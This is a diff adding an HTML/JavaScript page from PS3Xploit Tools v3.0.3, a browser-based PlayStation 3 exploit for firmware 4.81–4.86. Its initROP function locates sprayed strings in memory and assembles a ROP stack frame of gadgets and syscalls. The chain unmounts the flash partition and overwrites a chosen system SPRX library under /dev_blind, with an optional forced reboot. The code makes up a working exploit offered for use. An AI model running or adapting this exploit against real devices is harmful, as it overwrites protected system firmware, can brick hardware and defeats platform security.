@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="ps3xploit_v303.js"></script>
+<meta charset="UTF-8"> 
+<title>PS3Xploit Tools v3.0.3 - SPRX External Library Replacer</title>
+<script>
+function initROP(init)
+{
+	try
+	{
+		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
+		if(t_out!==0){clearTimeout(t_out);t_out=0;}
+		offset_array=[];
+		disable_all();
+		clearLogEntry();
+		store_idx_arr1=new Array(1);
+		store_idx_arr2=new Array(1);
+		xtra_data_addr=0;
+		stack_frame_addr=0;
+		jump_2_addr=0;
+		jump_1_addr=0;
+
+		var search_max_threshold=70*0x100000; // 70Mb maximum memory search
+		var search_base=0x80200000;//0x80190000;//
+		var search_size=2*mbytes;
+		search_base_off=0*mbytes;
+		search_size_ext=2*mbytes;
+		total_loops++;
+		
+		// Overwrite filename and destination path here
+		template_1_file_usb='/'+getdestFile();
+		template_1_file_blind='/dev_blind/sys/external'+template_1_file_usb;
+		
+		xtra_data=flash_partition.convert()
+		+filesystem.convert()
+		+mount_path.convert()
+		+getPath(template_1_file_usb).convert()
+		+fill_by_4bytes(0xC,dbyte00)
+		+template_1_file_blind.convert()
+		+make_dummy_xtra2()
+		+fill_by_16bytes(0x70,dbyte00)
+		+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)
+		+unescape("\uFD7E");
+		while(xtra_data_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
+			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
+			search_max_threshold-=search_size;
+		}
+		
+		flash_partition_addr=xtra_data_addr;
+		fs_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		mount_path_addr=fs_addr+filesystem.convertedSize();
+		
+		template_1_file_usb_addr=mount_path_addr+mount_path.convertedSize();
+		template_1_file_usbfd_addr=template_1_file_usb_addr+getPath(template_1_file_usb).convertedSize();
+		template_1_file_usb_readlen_addr=template_1_file_usbfd_addr+word_size;
+		
+		template_1_file_blind_addr=template_1_file_usb_readlen_addr+dword_size;
+		template_1_file_blindfd_addr=template_1_file_blind_addr+template_1_file_blind.convertedSize();
+		template_1_file_blind_writelen_addr=template_1_file_blindfd_addr+word_size;
+		store_idx_arr1[0]=(template_1_file_blind_writelen_addr-flash_partition_addr+0x8)/2;
+		
+		null_addr=template_1_file_blind_writelen_addr+dword_size+make_dummy_null_padding2()+dword_size;
+		
+		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
+		stat_addr=null_addr+dword_size*0x3;
+		reboot_sf_addr=stat_addr+dword_size*0xB;
+		//############################ Building stack frame ###############################################################
+		stack_frame=stack_frame_hookup()
+		+syscall(sc_fs_umount,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
+		+copy_file_overwrite(template_1_file_usb_addr,template_1_file_blind_addr,template_1_file_usbfd_addr,template_1_file_blindfd_addr,template_1_file_buf_addr,template_1_file_usb_readlen_addr,template_1_file_blind_writelen_addr,stat_addr,null_addr,null_addr+0x8)
+		+optional_reboot1(reboot_sf_addr,template_1_file_blind_writelen_addr)
+		+stack_frame_exit();
+		//############################ End stack frame ###############################################################		
+		
+		while(stack_frame_addr===0)
+		{
+			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
+			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
+			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
+			search_max_threshold-=search_size+search_size_ext;
+		}
+		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,dbyte41)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
+		while(jump_2_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
+		while(jump_1_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+		var sf=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length);
+		var x=checkMemory(xtra_data_addr-0x4,0x2000,xtra_data.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x800,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x800,jump_1.length);
+		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
+		{
+			if(t_out!==0){clearTimeout(t_out);}
+			showResult(hr+"<h1><b><font color=%22386E38%22>SPRX External Library Replacer initialized successfully.</font></b></h1><h3><b><span style='color:#000000;'>You can now copy SPRX Module to flash.</span></b></h3>");
+			enable_trigger();
+		}
+		else
+		{
+			if(x!==xtra_data)logAdd("xtra_data mismatch in memory!");
+			if(sf!==stack_frame)logAdd("stack_frame mismatch in memory!");
+			if(j2!==jump_2)logAdd("jump_2 mismatch in memory!");
+			if(j1!==jump_1)logAdd("jump_1 mismatch in memory!");
+			//logAdd("String mismatch in memory!");
+			load_check();
+		}
+	}
+	catch(e)
+	{
+		debug=true;
+		logAdd(br+"SPRX External Library Replacer initialization failed because the following exception was thrown during execution:"+br+e+" at : "+e.lineNumber);
+		debug=false;
+	}
+}
+
+function triggerX()
+{
+		clearLogEntry();
+		showResult(hr+"<h2><b><span style='color:#000000;'>Copying SPRX File To Flash...</span></b></h2>");
+		disable_all();
+		setTimeout(trigger,1000,jump_1_addr);
+		setTimeout(rop_exit_1val,2000,hr+"<h1><b><font color=%22386E38%22>SPRX External Library Replacer succeeded!</font></span></b></h1>",hr+"<h1><b><font color='red'>SPRX External Library Replacer failed!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>","<h3><b><span style='color:#000000;'>"+getdestFile()+" to "+template_1_file_blind+"</span></b></h3>");
+		cleanGUI();
+}
+</script>
+</head>
+	<body id="bodyId" style="background-color:#FFD097">
+	<div id="headerId" style="color:#CC2010">
+	<h1>PS3Xploit Tools v3.0.3 - SPRX External Library Replacer</h1>
+	<h2><span style="color:#000000">Courtesy of PS3Xploit Team</span></h2><b>esc0rtd3w </b><span style="color:#000000;"> (Debugging & Testing) <b>|</b> </span><b>habib </b><span style="color:#000000"> (Reverse Engineering & Debugging) <b>|</b> </span><b>bguerville </b><span style="color:#000000"> (ROP, Javascript & Debugging)</span><hr>
+		<span style="color:#000000">Many thanks to xerpi for porting the memory leak exploit to ps3, zecoxao & Joonie for their early & renewed support, mysis for documenting vsh/lv2, SSL for his regular & precious advice, kakaroto for the PS3 IDA tools, naherwert for scetool, Rebug Team for producing/updating the only CFW adequate to develop this work & Cobra team for sharing their CobraUSB source, the psdevwiki team of course, STLcardsWS for his long standing contribution & ever constant support.<br>We also wish to thank all the ps3 community hackers/devs, past & present, who directly or indirectly helped us put this project together, you know who you are...</span><hr>
+	<h3>Supports CEX/DEX 4.81 - 4.85/4.86 OFW/CFW/HFW Firmware</h3>
+	<p><span style="color:#000000">More details & news on</span> <a href="http://www.psx-place.com/forums/ps3xploit">http://www.psx-place.com</a></p>
+	<hr></div>
+	
+	<b>Select Source SPRX File:</b><br>
+	<select name="dpath" id="combodestFile" onchange="getdestFile();" >
+	<option value="libaacenc.sprx">libaacenc.sprx</option>
+	<option value="libaacenc_spurs.sprx">libaacenc_spurs.sprx</option>
+	<option value="libac3dec.sprx">libac3dec.sprx</option>
+	<option value="libac3dec2.sprx">libac3dec2.sprx</option>
+	<option value="libad_async.sprx">libad_async.sprx</option>
+	<option value="libad_billboard_util.sprx">libad_billboard_util.sprx</option>
+	<option value="libad_core.sprx">libad_core.sprx</option>
+	<option value="libadec.sprx">libadec.sprx</option>
+	<option value="libadec_internal.sprx">libadec_internal.sprx</option>
+	<option value="libadec2.sprx">libadec2.sprx</option>
+	<option value="libapostsrc_mini.sprx">libapostsrc_mini.sprx</option>
+	<option value="libasfparser2_astd.sprx">libasfparser2_astd.sprx</option>
+	<option value="libat3dec.sprx">libat3dec.sprx</option>
+	<option value="libat3multidec.sprx">libat3multidec.sprx</option>
+	<option value="libatrac3multi.sprx">libatrac3multi.sprx</option>
+	<option value="libatrac3plus.sprx">libatrac3plus.sprx</option>
+	<option value="libatxdec.sprx">libatxdec.sprx</option>
+	<option value="libatxdec2.sprx">libatxdec2.sprx</option>
+	<option value="libaudio.sprx">libaudio.sprx</option>
+	<option value="libavcdec.sprx">libavcdec.sprx</option>
+	<option value="libavcenc.sprx">libavcenc.sprx</option>
+	<option value="libavcenc_small.sprx">libavcenc_small.sprx</option>
+	<option value="libavchatjpgdec.sprx">libavchatjpgdec.sprx</option>
+	<option value="libbeisobmf.sprx">libbeisobmf.sprx</option>
+	<option value="libbemp2sys.sprx">libbemp2sys.sprx</option>
+	<option value="libcamera.sprx">libcamera.sprx</option>
+	<option value="libcelp8dec.sprx">libcelp8dec.sprx</option>
+	<option value="libcelp8enc.sprx">libcelp8enc.sprx</option>
+	<option value="libcelpdec.sprx">libcelpdec.sprx</option>
+	<option value="libcelpenc.sprx">libcelpenc.sprx</option>
+	<option value="libddpdec.sprx">libddpdec.sprx</option>
+	<option value="libdivxdec.sprx">libdivxdec.sprx</option>
+	<option value="libdmux.sprx">libdmux.sprx</option>
+	<option value="libdmuxpamf.sprx">libdmuxpamf.sprx</option>
+	<option value="libdtslbrdec.sprx">libdtslbrdec.sprx</option>
+	<option value="libfiber.sprx">libfiber.sprx</option>
+	<option value="libfont.sprx">libfont.sprx</option>
+	<option value="libfontFT.sprx">libfontFT.sprx</option>
+	<option value="libfreetype.sprx">libfreetype.sprx</option>
+	<option value="libfreetypeTT.sprx">libfreetypeTT.sprx</option>
+	<option value="libfs.sprx">libfs.sprx</option>
+	<option value="libfs_155.sprx">libfs_155.sprx</option>
+	<option value="libgcm_sys.sprx">libgcm_sys.sprx</option>
+	<option value="libgem.sprx">libgem.sprx</option>
+	<option value="libgifdec.sprx">libgifdec.sprx</option>
+	<option value="libhttp.sprx">libhttp.sprx</option>
+	<option value="libio.sprx">libio.sprx</option>
+	<option value="libjpgdec.sprx">libjpgdec.sprx</option>
+	<option value="libjpgenc.sprx">libjpgenc.sprx</option>
+	<option value="libkey2char.sprx">libkey2char.sprx</option>
+	<option value="libl10n.sprx">libl10n.sprx</option>
+	<option value="liblv2.sprx">liblv2.sprx</option>
+	<option value="liblv2coredump.sprx">liblv2coredump.sprx</option>
+	<option value="liblv2dbg_for_cex.sprx">liblv2dbg_for_cex.sprx</option>
+	<option value="libm2bcdec.sprx">libm2bcdec.sprx</option>
+	<option value="libm4aacdec.sprx">libm4aacdec.sprx</option>
+	<option value="libm4aacdec2ch.sprx">libm4aacdec2ch.sprx</option>
+	<option value="libm4hdenc.sprx">libm4hdenc.sprx</option>
+	<option value="libm4venc.sprx">libm4venc.sprx</option>
+	<option value="libmedi.sprx">libmedi.sprx</option>
+	<option value="libmic.sprx">libmic.sprx</option>
+	<option value="libmp3dec.sprx">libmp3dec.sprx</option>
+	<option value="libmp4.sprx">libmp4.sprx</option>
+	<option value="libmpl1dec.sprx">libmpl1dec.sprx</option>
+	<option value="libmvcdec.sprx">libmvcdec.sprx</option>
+	<option value="libnet.sprx">libnet.sprx</option>
+	<option value="libnetctl.sprx">libnetctl.sprx</option>
+	<option value="libpamf.sprx">libpamf.sprx</option>
+	<option value="libpngdec.sprx">libpngdec.sprx</option>
+	<option value="libpngenc.sprx">libpngenc.sprx</option>
+	<option value="libresc.sprx">libresc.sprx</option>
+	<option value="librtc.sprx">librtc.sprx</option>
+	<option value="librudp.sprx">librudp.sprx</option>
+	<option value="libsail.sprx">libsail.sprx</option>
+	<option value="libsail_avi.sprx">libsail_avi.sprx</option>
+	<option value="libsail_rec.sprx">libsail_rec.sprx</option>
+	<option value="libsjvtd.sprx">libsjvtd.sprx</option>
+	<option value="libsmvd2.sprx">libsmvd2.sprx</option>
+	<option value="libsmvd4.sprx">libsmvd4.sprx</option>
+	<option value="libspurs_jq.sprx">libspurs_jq.sprx</option>
+	<option value="libsre.sprx">libsre.sprx</option>
+	<option value="libssl.sprx">libssl.sprx</option>
+	<option value="libsvc1d.sprx">libsvc1d.sprx</option>
+	<option value="libsync2.sprx">libsync2.sprx</option>
+	<option value="libsysmodule.sprx">libsysmodule.sprx</option>
+	<option value="libsysutil.sprx">libsysutil.sprx</option>
+	<option value="libsysutil_ap.sprx">libsysutil_ap.sprx</option>
+	<option value="libsysutil_authdialog.sprx">libsysutil_authdialog.sprx</option>
+	<option value="libsysutil_avc_ext.sprx">libsysutil_avc_ext.sprx</option>
+	<option value="libsysutil_avc2.sprx">libsysutil_avc2.sprx</option>
+	<option value="libsysutil_avconf_ext.sprx">libsysutil_avconf_ext.sprx</option>
+	<option value="libsysutil_bgdl.sprx">libsysutil_bgdl.sprx</option>
+	<option value="libsysutil_cross_controller.sprx">libsysutil_cross_controller.sprx</option>
+	<option value="libsysutil_dec_psnvideo.sprx">libsysutil_dec_psnvideo.sprx</option>
+	<option value="libsysutil_dtcp_ip.sprx">libsysutil_dtcp_ip.sprx</option>
+	<option value="libsysutil_game.sprx">libsysutil_game.sprx</option>
+	<option value="libsysutil_game_exec.sprx">libsysutil_game_exec.sprx</option>
+	<option value="libsysutil_imejp.sprx">libsysutil_imejp.sprx</option>
+	<option value="libsysutil_misc.sprx">libsysutil_misc.sprx</option>
+	<option value="libsysutil_music.sprx">libsysutil_music.sprx</option>
+	<option value="libsysutil_music_decode.sprx">libsysutil_music_decode.sprx</option>
+	<option value="libsysutil_music_export.sprx">libsysutil_music_export.sprx</option>
+	<option value="libsysutil_np.sprx">libsysutil_np.sprx</option>
+	<option value="libsysutil_np_clans.sprx">libsysutil_np_clans.sprx</option>
+	<option value="libsysutil_np_commerce2.sprx">libsysutil_np_commerce2.sprx</option>
+	<option value="libsysutil_np_eula.sprx">libsysutil_np_eula.sprx</option>
+	<option value="libsysutil_np_installer.sprx">libsysutil_np_installer.sprx</option>
+	<option value="libsysutil_np_sns.sprx">libsysutil_np_sns.sprx</option>
+	<option value="libsysutil_np_trophy.sprx">libsysutil_np_trophy.sprx</option>
+	<option value="libsysutil_np_tus.sprx">libsysutil_np_tus.sprx</option>
+	<option value="libsysutil_np_util.sprx">libsysutil_np_util.sprx</option>
+	<option value="libsysutil_np2.sprx">libsysutil_np2.sprx</option>
+	<option value="libsysutil_oskdialog_ext.sprx">libsysutil_oskdialog_ext.sprx</option>
+	<option value="libsysutil_pesm.sprx">libsysutil_pesm.sprx</option>
+	<option value="libsysutil_photo_decode.sprx">libsysutil_photo_decode.sprx</option>
+	<option value="libsysutil_photo_export.sprx">libsysutil_photo_export.sprx</option>
+	<option value="libsysutil_photo_export2.sprx">libsysutil_photo_export2.sprx</option>
+	<option value="libsysutil_photo_import.sprx">libsysutil_photo_import.sprx</option>
+	<option value="libsysutil_photo_network_sharing.sprx">libsysutil_photo_network_sharing.sprx</option>
+	<option value="libsysutil_print.sprx">libsysutil_print.sprx</option>
+	<option value="libsysutil_rec.sprx">libsysutil_rec.sprx</option>
+	<option value="libsysutil_remoteplay.sprx">libsysutil_remoteplay.sprx</option>
+	<option value="libsysutil_rtcalarm.sprx">libsysutil_rtcalarm.sprx</option>
+	<option value="libsysutil_savedata.sprx">libsysutil_savedata.sprx</option>
+	<option value="libsysutil_savedata_psp.sprx">libsysutil_savedata_psp.sprx</option>
+	<option value="libsysutil_screenshot.sprx">libsysutil_screenshot.sprx</option>
+	<option value="libsysutil_search.sprx">libsysutil_search.sprx</option>
+	<option value="libsysutil_storagedata.sprx">libsysutil_storagedata.sprx</option>
+	<option value="libsysutil_subdisplay.sprx">libsysutil_subdisplay.sprx</option>
+	<option value="libsysutil_syschat.sprx">libsysutil_syschat.sprx</option>
+	<option value="libsysutil_sysconf_ext.sprx">libsysutil_sysconf_ext.sprx</option>
+	<option value="libsysutil_userinfo.sprx">libsysutil_userinfo.sprx</option>
+	<option value="libsysutil_video_export.sprx">libsysutil_video_export.sprx</option>
+	<option value="libsysutil_video_player.sprx">libsysutil_video_player.sprx</option>
+	<option value="libsysutil_video_upload.sprx">libsysutil_video_upload.sprx</option>
+	<option value="libusbd.sprx">libusbd.sprx</option>
+	<option value="libusbpspcm.sprx">libusbpspcm.sprx</option>
+	<option value="libvdec.sprx">libvdec.sprx</option>
+	<option value="libvoice.sprx">libvoice.sprx</option>
+	<option value="libvpost.sprx">libvpost.sprx</option>
+	<option value="libvpost2.sprx">libvpost2.sprx</option>
+	<option value="libwmadec.sprx">libwmadec.sprx</option>
+	</select>
+	
+	<p><span style="color:#000000"><b>Root Path</b> </span>
+	<select id="combofilePath" name="fPath" size="1" onChange="selectfilePath()">
+	<option id="usb_0" selected="selected" value="/dev_usb000">/dev_usb000</option><option id="usb_1" value="/dev_usb001">/dev_usb001</option><option id="usb_6" value="/dev_usb006">/dev_usb006</option><option id="xploit_extras" value="/dev_hdd0/game/PS3XPLOIT/USRDIR/extras">/dev_hdd0/game/PS3XPLOIT/USRDIR/extras</option><option id="han_toolbox" value="/dev_hdd0/game/HANTOOLBX/USRDIR/files/">/dev_hdd0/game/HANTOOLBX/USRDIR/files/</option>
+	</select> | Auto-Close Browser <input type="checkbox" id="auto_close" name="aclose" onclick="autoclose();"/> | Auto-Reboot <input type="checkbox" id="auto_reboot" name="areboot" checked="checked" onclick="autoreboot();"/>
+	<span id="dex_txt" style="visibility:hidden"> | DEX mode<input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/></span></p>
+	<p><button id="btnROP" type="button" onclick="initROP(true);" autofocus>Initialize SPRX External Library Replacer</button> | 
+	<button id="btnTrigger" disabled="" type="button" onclick="triggerX();">Copy SPRX File To Flash</button><span id="reset" style="visibility:hidden"> | <button id="btnReset" type="button" onclick="disable_trigger();">Reset</button></span></p>
+	<div id="result" style="color:#CC2010"></div><br>
+	<div id="log"></div>
+	<div id="exploit" ></div>
+	<div id="trigger"></div>
+	<div id="footer"></div>
+	<script>
+		writeEnvInfo();
+		ps3chk();
+	</script>
+	</body>
+</html>
